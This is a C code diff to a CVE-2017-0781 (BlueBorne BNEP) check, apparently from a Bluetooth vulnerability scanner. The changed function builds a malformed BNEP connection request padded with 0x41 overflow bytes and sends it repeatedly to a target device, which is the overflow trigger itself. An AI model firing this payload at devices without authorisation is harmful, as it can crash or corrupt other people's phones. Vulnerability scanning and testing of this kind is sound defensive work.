@@ -208,9 +208,10 @@ int is_vulnerable_to_cve_2017_0785(bdaddr_t *target)
 int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
 {
     struct sockaddr_l2 addr = { 0 };
-    int sd;
+    int sd, i;
     const uint8_t overflow_payload_val = 0x41;
-    bnep_overflow_extension_packet pkt; 
+    char *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN);
+    struct bnep_setup_conn_req *conn_req;
     
     // Return a negative integer indicating failure to create socket
     if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
@@ -220,17 +221,19 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
     addr.l2_family = AF_BLUETOOTH;
     addr.l2_psm = htobs(BNEP_PSM);
 
-    pkt.type = BNEP_CONTROL_W_EXTENSION;
-    pkt.ctl_type = BNEP_SETUP_CONN_REQ;
-    pkt.len = 0;
-    memset(pkt.data, overflow_payload_val, 8);
+    conn_req = (struct bnep_setup_conn_req *) packet;
+    conn_req->type = BNEP_CONTROL_W_EXTENSION;
+    conn_req->ctrl = BNEP_SETUP_CONN_REQ;
+    conn_req->uuid_size = 0;
+
+    memset(&(conn_req->service), overflow_payload_val, BNEP_OVERFLOW_PAYLOAD_LEN);
 
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
         return CVE_CHECK_ERR;
-    // Send initial PDU
-    if (write(sd, &pkt, sizeof(pkt)) < 0)
-        return CVE_CHECK_ERR;
-    // close(sd);
+    for (int i = 0; i < BNEP_OVERFLOW_LOOP_LIMIT; i++)
+        if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN) < 0)
+            return CVE_CHECK_ERR;
+    close(sd);
     return 0;
 }
 
